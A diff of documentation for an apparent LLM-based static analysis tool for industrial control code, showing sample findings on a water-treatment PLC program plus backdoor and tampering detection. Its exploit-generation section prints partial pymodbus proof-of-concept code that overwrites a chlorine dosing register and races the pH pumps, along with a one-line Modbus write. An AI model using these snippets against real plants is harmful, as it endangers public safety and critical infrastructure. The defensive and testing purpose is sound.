@@ -1,6 +1,6 @@
 # SAST / LLM Analysis
 
-IXF includes an offline Static Application Security Testing (SAST) module powered by large language models. It analyzes PLC/RTU/SCADA source code for security vulnerabilities, unsafe setpoints, authentication gaps, hardcoded credentials, race conditions, and process-specific attack vectors — without unintentionally uploading sensitive code to external services (see sanitization section).
+IXF includes an offline Static Application Security Testing (SAST) module powered by large language models. It analyzes PLC/RTU/SCADA source code for security vulnerabilities, unsafe setpoints, authentication gaps, hardcoded credentials, race conditions, and process-specific attack vectors - without unintentionally uploading sensitive code to external services (see sanitization section).
 
 The SAST engine is designed specifically for industrial control system code, with domain-specific prompts that understand Ladder Diagram logic, Structured Text safety interlocks, Function Block Diagram dataflows, and IEC 61131-3 programming semantics.
 
@@ -107,9 +107,9 @@ ixf > sast <path> [--mode <mode>] [--diff <other_file>]
 
 | Argument | Type | Required | Default | Description |
 |----------|------|----------|---------|-------------|
-| path | string | yes | — | PLC source file or project directory |
+| path | string | yes | - | PLC source file or project directory |
 | `--mode` | string | no | `sast` | Analysis mode: `sast`, `reverse`, `diff`, `exploit-gen` |
-| `--diff` | string | no | — | Second file/directory for `diff` mode |
+| `--diff` | string | no | - | Second file/directory for `diff` mode |
 
 ---
 
@@ -140,7 +140,7 @@ ixf > sast <path> [--mode <mode>] [--diff <other_file>]
 
 Before any code is sent to the LLM, IXF applies a multi-pass sanitization pipeline. This prevents leaking sensitive operational data to cloud APIs.
 
-**Sanitization is always applied — it cannot be disabled.**
+**Sanitization is always applied - it cannot be disabled.**
 
 ### All 7 Sanitization Types
 
@@ -248,7 +248,7 @@ FINDING [SEVERITY: HIGH]: Programming Port Without Authentication
   Code:     LD PROGRAMMING_PORT_ENABLED
             ST TRUE  (* No authentication check *)
   Issue:    PLC programming interface enabled without requiring authentication
-  Attack:   T0843 (Program Download) — any host can download modified PLC program
+  Attack:   T0843 (Program Download) - any host can download modified PLC program
   Fix:      Add authentication check: IF ENGINEER_AUTHENTICATED THEN PROG_ENABLE := TRUE
 ```
 
@@ -264,7 +264,7 @@ FINDING [SEVERITY: HIGH]: Race Condition in Chemical Dosing
             (* Cycle 2: *) IF pH > 8.0 THEN BASE_PUMP := TRUE; END_IF
   Issue:    pH sensor read happens asynchronously between cycles.
             Both pumps can be TRUE simultaneously during rapid pH oscillation.
-  Physical: pH < 2 or pH > 12 — severely corrosive water — infrastructure damage
+  Physical: pH < 2 or pH > 12 - severely corrosive water - infrastructure damage
   Fix:      Add mutex: IF ACID_PUMP THEN BASE_PUMP := FALSE; END_IF
             Or use atomic pH read with single decision point per scan
 ```
@@ -279,7 +279,7 @@ FINDING [SEVERITY: CRITICAL]: Safety Interlock Disabled
   Location: reactor.st, line 88
   Code:     (* TEMP_INTERLOCK := TRUE; *)  (* TODO: re-enable after maintenance *)
             HEATER_ENABLE := TRUE;  (* Heater can run without temperature limit *)
-  Issue:    Temperature interlock commented out — heater runs without safety limit
+  Issue:    Temperature interlock commented out - heater runs without safety limit
   Physical: Thermal runaway → reactor vessel overpressure → catastrophic failure
   Fix:      Restore: TEMP_INTERLOCK := (REACTOR_TEMP < MAX_SAFE_TEMP);
             HEATER_ENABLE := HEATER_REQUEST AND TEMP_INTERLOCK;
@@ -288,7 +288,7 @@ FINDING [SEVERITY: CRITICAL]: Safety Interlock Disabled
 
 ### Category 5: Hardcoded Credentials and Secrets
 
-Identifies hardcoded passwords, API keys, connection strings, and authentication tokens in PLC code. (Reported in sanitized form — actual values not included in report.)
+Identifies hardcoded passwords, API keys, connection strings, and authentication tokens in PLC code. (Reported in sanitized form - actual values not included in report.)
 
 **Example finding:**
 ```
@@ -311,8 +311,8 @@ FINDING [SEVERITY: HIGH]: Unencrypted OPC UA Session
   Location: opcua_client.py, line 23
   Code:     client = Client("opc.tcp://[ENDPOINT_REDACTED]")
             client.set_security_policy(SecurityPolicyType.None_)  # No security
-  Issue:    OPC UA session with SecurityMode=None — all data in plaintext
-  Attack:   T0830 (Adversary-in-the-Middle) — intercept tag reads/writes
+  Issue:    OPC UA session with SecurityMode=None - all data in plaintext
+  Attack:   T0830 (Adversary-in-the-Middle) - intercept tag reads/writes
   Fix:      Use SecurityPolicy.Basic256Sha256 with certificate-based authentication:
             await client.set_security(
                 SecurityPolicyType.Basic256Sha256,
@@ -326,13 +326,13 @@ Analyzes the physical implications of identified vulnerabilities. Provides conte
 
 **Example finding:**
 ```
-FINDING [CONTEXT: CATASTROPHIC POTENTIAL]: Process Type — Water Treatment
+FINDING [CONTEXT: CATASTROPHIC POTENTIAL]: Process Type - Water Treatment
   Location: water_treatment.st (full program analysis)
   Physical Process: Drinking water treatment for municipal supply
   Identified Attack Surface:
-    - Chlorine dosing setpoint: unvalidated (CRITICAL — can cause lethal dosing)
-    - pH neutralization: race condition (HIGH — corrosive water potential)
-    - Turbidity monitoring: sensor bypass possible (MEDIUM — pathogen passage)
+    - Chlorine dosing setpoint: unvalidated (CRITICAL - can cause lethal dosing)
+    - pH neutralization: race condition (HIGH - corrosive water potential)
+    - Turbidity monitoring: sensor bypass possible (MEDIUM - pathogen passage)
   Aggregate Physical Impact Assessment:
     Exploiting CRITICAL + HIGH findings together:
     → Lethally chlorinated water delivered to population (>2000x WHO limit)
@@ -354,16 +354,16 @@ FINDING [SEVERITY: LOW]: Security-Relevant TODO Comment
               INHIBIT_ALL_ALARMS := TRUE;  (* Suppresses all safety alarms *)
               SAFETY_SIL2_BYPASS := TRUE;
             END_IF
-  Issue:    Safety bypass without authentication check — acknowledged as missing in code
+  Issue:    Safety bypass without authentication check - acknowledged as missing in code
   Risk:     Any operator (or attacker) can trigger emergency override without MFA
   Fix:      Add authentication: IF EMERGENCY_OVERRIDE AND SUPERVISOR_AUTH THEN ...
 ```
 
 ---
 
-## Analysis Modes — Complete Reference
+## Analysis Modes - Complete Reference
 
-### `--mode sast` (Default) — Full Vulnerability Analysis
+### `--mode sast` (Default) - Full Vulnerability Analysis
 
 ```
 ixf > sast /opt/plc_projects/water_treatment/ --mode sast
@@ -396,11 +396,11 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
   Type:         Input Validation Flaw / Unsafe Setpoint
   Code:
     SP_CHLORINE_HIGH := 4000.0;  (* TODO: validate this value *)
-    DOSE_FACTOR := MW_DOSE_FACTOR;  (* HR[200] — no range check *)
-  Attack Vector: Modbus FC16 write to HR[200] (DOSE_FACTOR) — no authentication required
+    DOSE_FACTOR := MW_DOSE_FACTOR;  (* HR[200] - no range check *)
+  Attack Vector: Modbus FC16 write to HR[200] (DOSE_FACTOR) - no authentication required
   Physical Impact: Setting DOSE_FACTOR to max (65535) → ~4000 mg/L chlorine
                    WHO safe limit: 2.0 mg/L | Lethal threshold (infants): ~5 mg/L
-                   CATASTROPHIC potential — mass casualty if distributed
+                   CATASTROPHIC potential - mass casualty if distributed
   MITRE ATT&CK for ICS: T0836 (Modify Parameter), T0878 (Alarm Suppression)
   Exploit PoC:   modbus_write_register(unit=1, address=200, value=65535)
   Remediation:
@@ -425,7 +425,7 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
     IF pH_SENSOR > 8.0 THEN BASE_PUMP := TRUE; END_IF
   Issue:        pH sensor value can change between the two IF evaluations in a single
                 scan cycle (interrupt-driven ADC update). Both pumps active simultaneously.
-  Physical:     pH <2 or pH >12 — severely corrosive water
+  Physical:     pH <2 or pH >12 - severely corrosive water
   MITRE:        T0831 (Manipulation of Control)
   Remediation:  Cache sensor at scan start; add mutual exclusion
     pH_CACHED := pH_SENSOR;
@@ -440,7 +440,7 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
   Title:        Unauthenticated PLC Programming Interface
   Location:     network_config.st, line 12
   Category:     Authentication and Access Control (Category 2)
-  Code:         PROGRAMMING_PORT := 502; (* dev mode — auth not implemented *)
+  Code:         PROGRAMMING_PORT := 502; (* dev mode - auth not implemented *)
   Issue:        Any host on the OT network can download a modified PLC program
   MITRE:        T0843 (Program Download)
   Remediation:  Disable port in production; require engineering station certificate
@@ -451,7 +451,7 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
   Title:        Hardcoded Database Credentials
   Location:     historian_connector.st, line 8
   Category:     Hardcoded Credentials (Category 5)
-  Code:         [CONN_STRING_REDACTED] (sanitized — original contained credentials)
+  Code:         [CONN_STRING_REDACTED] (sanitized - original contained credentials)
   Issue:        Historian connection string with hardcoded credentials
   Remediation:  Use vault or environment-based credential injection
 
@@ -461,13 +461,13 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
   Title:        Missing Watchdog Timer
   Location:     main.st (entire program)
   Category:     Missing Safety Interlocks (Category 4)
-  Issue:        No watchdog timer configured — PLC could hang indefinitely
+  Issue:        No watchdog timer configured - PLC could hang indefinitely
   Remediation:  WDT_Enable := TRUE; WDT_Timeout := 500; (* 500ms scan watchdog *)
 
   ════════════════════════════════════════════════════════════════════════
   FINDING 6 [INFO: Physical Process Context]
   ════════════════════════════════════════════════════════════════════════
-  Title:        Process Type Identified — Municipal Water Treatment
+  Title:        Process Type Identified - Municipal Water Treatment
   Assessment:   High-value target. All findings above have elevated real-world consequence
                 compared to equivalent vulnerabilities in non-critical processes.
                 Aggregate exploitation of CRITICAL + HIGH findings creates mass casualty potential.
@@ -482,7 +482,7 @@ ixf > sast /opt/plc_projects/water_treatment/ --mode sast
 
 ---
 
-### `--mode reverse` — Reverse Engineering Analysis
+### `--mode reverse` - Reverse Engineering Analysis
 
 Analyzes binary or opaque compiled PLC firmware to extract logic, identify behavior patterns, and flag security concerns.
 
@@ -490,7 +490,7 @@ Analyzes binary or opaque compiled PLC firmware to extract logic, identify behav
 ixf > sast /opt/plc_dumps/plc_firmware_v3.2.bin --mode reverse
 [*] Target: /opt/plc_dumps/plc_firmware_v3.2.bin (binary, 847 KB)
 [*] Provider: gemini (gemini-2.5-flash)
-[*] Mode: reverse — LLM-assisted binary/firmware analysis
+[*] Mode: reverse - LLM-assisted binary/firmware analysis
 [*] Extracting readable strings and structure markers...
 [*] Sanitizing extracted content...
 [*] Sending to LLM for reverse analysis...
@@ -512,12 +512,12 @@ ixf > sast /opt/plc_dumps/plc_firmware_v3.2.bin --mode reverse
   ─────────────────────────────────────────────────────────────
   EXTRACTED INDICATORS:
   ─────────────────────────────────────────────────────────────
-  String match: "password" (offset 0x1A44) — potential hardcoded credential
-  String match: "192.168.[IP_REDACTED]" (3 occurrences) — hardcoded IPs found
-  String match: "ADMIN_OVERRIDE=1" — undocumented override flag
-  String match: "DEBUG_MODBUS_PASSTHROUGH" — debug mode not removed from production FW
-  Function name (symbol table): "auth_bypass_legacy()" — suspicious function name
-  Modbus handler: FC16 write — no bounds checking on value range (assembly analysis)
+  String match: "password" (offset 0x1A44) - potential hardcoded credential
+  String match: "192.168.[IP_REDACTED]" (3 occurrences) - hardcoded IPs found
+  String match: "ADMIN_OVERRIDE=1" - undocumented override flag
+  String match: "DEBUG_MODBUS_PASSTHROUGH" - debug mode not removed from production FW
+  Function name (symbol table): "auth_bypass_legacy()" - suspicious function name
+  Modbus handler: FC16 write - no bounds checking on value range (assembly analysis)
 
   ─────────────────────────────────────────────────────────────
   SECURITY FINDINGS:
@@ -545,9 +545,9 @@ ixf > sast /opt/plc_dumps/plc_firmware_v3.2.bin --mode reverse
 
 ---
 
-### `--mode diff` — Code Change Detection
+### `--mode diff` - Code Change Detection
 
-Compares two versions of PLC code to detect unauthorized modifications — a key use case for detecting supply chain attacks, insider threats, and Stuxnet/Triton-style targeted modifications.
+Compares two versions of PLC code to detect unauthorized modifications - a key use case for detecting supply chain attacks, insider threats, and Stuxnet/Triton-style targeted modifications.
 
 ```
 ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
@@ -564,14 +564,14 @@ ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
   Total changes: 4 sections modified, 2 sections added, 0 deleted
 
   ─────────────────────────────────────────────────────────────
-  CHANGE 1: AUTHORIZED — Routine maintenance
+  CHANGE 1: AUTHORIZED - Routine maintenance
   ─────────────────────────────────────────────────────────────
   Location: Lines 12-15 (header comment)
   Change: Version comment updated from "v1.0" to "v1.1"
-  Assessment: BENIGN — version tracking only
+  Assessment: BENIGN - version tracking only
 
   ─────────────────────────────────────────────────────────────
-  CHANGE 2: SUSPICIOUS — Requires investigation
+  CHANGE 2: SUSPICIOUS - Requires investigation
   ─────────────────────────────────────────────────────────────
   Location: Lines 47-53 (safety interlock block)
   Version A (before):
@@ -581,9 +581,9 @@ ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
       ALARM := TRUE;          (* Alerts operator *)
     END_IF
 
-  Version B (after — CURRENT):
+  Version B (after - CURRENT):
     IF PRESSURE > MAX_PRESSURE THEN
-      (* SAFETY_VALVE := TRUE; *)   (* — commented out 2026-05-28 *)
+      (* SAFETY_VALVE := TRUE; *)   (* - commented out 2026-05-28 *)
       FAKE_PRESSURE := 45.0;        (* spoofed to hide overpressure *)
       EMERGENCY_STOP := FALSE;      (* stop prevented *)
       ALARM := FALSE;               (* alarm silenced *)
@@ -600,30 +600,30 @@ ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
               Preserve evidence. Notify CISO and ICS-CERT if critical infrastructure.
 
   ─────────────────────────────────────────────────────────────
-  CHANGE 3: UNAUTHORIZED — Command and control addition
+  CHANGE 3: UNAUTHORIZED - Command and control addition
   ─────────────────────────────────────────────────────────────
   Location: Lines 89-95 (new block added)
   Version A: (section did not exist)
   Version B:
-    (* Maintenance backdoor — remove before production *)
+    (* Maintenance backdoor - remove before production *)
     IF HIDDEN_TRIGGER = 0xDEAD THEN
       COIL_REMOTE_ENABLE := TRUE;  (* allows remote coil control *)
       MODBUS_AUTH_BYPASS := TRUE;  (* disables Modbus auth *)
     END_IF
   Assessment: [SEVERITY: CRITICAL] BACKDOOR DETECTED
   Analysis:   Magic value (0xDEAD) triggers remote control bypass.
-              Comment "remove before production" was not removed — deliberate.
+              Comment "remove before production" was not removed - deliberate.
   MITRE:      T0859 (Valid Accounts bypass), T0836
 
   ─────────────────────────────────────────────────────────────
-  CHANGE 4: BENIGN — Parameter update
+  CHANGE 4: BENIGN - Parameter update
   ─────────────────────────────────────────────────────────────
   Location: Lines 34-35
   Change: PUMP_SPEED_MAX from 3000 to 3100 RPM
-  Assessment: Likely authorized maintenance change — verify with change log
+  Assessment: Likely authorized maintenance change - verify with change log
 
   ─────────────────────────────────────────────────────────────
-  OVERALL ASSESSMENT: CRITICAL — 2 unauthorized modifications detected
+  OVERALL ASSESSMENT: CRITICAL - 2 unauthorized modifications detected
   ─────────────────────────────────────────────────────────────
   Action: Immediate rollback to /backup/plc_v1.st
           Preserve both files for forensic analysis
@@ -635,7 +635,7 @@ ixf > sast /backup/plc_v1.st --mode diff --diff /current/plc_v2.st
 
 ---
 
-### `--mode exploit-gen` — Exploit Generation
+### `--mode exploit-gen` - Exploit Generation
 
 Generates proof-of-concept exploit code based on SAST findings. For authorized penetration testing.
 
@@ -653,13 +653,13 @@ ixf > sast /opt/plc_projects/water_treatment/water_treatment.st --mode exploit-g
   Findings used: CRITICAL (Chlorine Dosing Setpoint), HIGH (Race Condition)
 
   ════════════════════════════════════════════════════════════════
-  EXPLOIT 1 — CRITICAL Finding: Chlorine Dosing Attack
+  EXPLOIT 1 - CRITICAL Finding: Chlorine Dosing Attack
   ════════════════════════════════════════════════════════════════
 
   Description: Writes maximum dosing value to HR[200] (DOSE_FACTOR) via unauthenticated
                Modbus TCP to cause catastrophic chlorine overdose
   Language:    Python (pymodbus)
-  Impact:      CATASTROPHIC — mass casualty potential
+  Impact:      CATASTROPHIC - mass casualty potential
 
   Generated PoC:
   ─────────────────────────────────────────────────────────────────
@@ -710,13 +710,13 @@ ixf > sast /opt/plc_projects/water_treatment/water_treatment.st --mode exploit-g
   ─────────────────────────────────────────────────────────────────
 
   ════════════════════════════════════════════════════════════════
-  EXPLOIT 2 — HIGH Finding: pH Race Condition Trigger
+  EXPLOIT 2 - HIGH Finding: pH Race Condition Trigger
   ════════════════════════════════════════════════════════════════
 
   Description: Rapidly toggles pH sensor readings to trigger both acid and base pump
                simultaneously during race condition window
   Language:    Python (pymodbus)
-  Impact:      HIGH — corrosive water production
+  Impact:      HIGH - corrosive water production
 
   Generated PoC:
   ─────────────────────────────────────────────────────────────────
@@ -737,10 +737,10 @@ ixf > sast /opt/plc_projects/water_treatment/water_treatment.st --mode exploit-g
       # Toggle between acid-triggering and base-triggering pH values
       # within a single PLC scan cycle timeframe
       client.write_registers(150, [500], unit=1)   # pH 5.0 → triggers ACID_PUMP
-      time.sleep(0.005)                              # 5ms — within scan cycle
+      time.sleep(0.005)                              # 5ms - within scan cycle
       client.write_registers(150, [850], unit=1)   # pH 8.5 → triggers BASE_PUMP
       time.sleep(0.005)
-      print(f"[*] Iteration {i+1}/20 — both pumps may be active simultaneously")
+      print(f"[*] Iteration {i+1}/20 - both pumps may be active simultaneously")
 
   client.close()
   ─────────────────────────────────────────────────────────────────
@@ -884,7 +884,7 @@ ixf > sast /large_project/ --mode sast
 ```
 ixf > sast /opt/plc.st
 [*] Sending to LLM...
-[-] LLM API error (gemini): 429 Too Many Requests — quota exceeded
+[-] LLM API error (gemini): 429 Too Many Requests - quota exceeded
 [i] Wait and retry, or switch to a different provider:
     ixf > llm-key openai sk-...
 [i] Or use the GOOGLE_AI_STUDIO_API_KEY for free tier (with limits)
